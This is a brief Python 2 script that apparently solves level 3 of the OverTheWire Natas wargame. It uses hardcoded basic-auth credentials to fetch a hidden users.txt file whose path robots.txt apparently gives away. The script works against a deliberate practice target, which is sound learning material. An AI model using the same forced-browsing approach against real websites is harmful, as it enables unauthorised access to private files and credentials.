import requests

target = 'http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org'
target1 = 'http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/robots.txt'
target2 = 'http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/s3cr3t/users.txt'
r = requests.get(target2)

if r.status_code != requests.codes.ok :
	print 'Unable to connect'
else :
	print 'Connected'

print r.content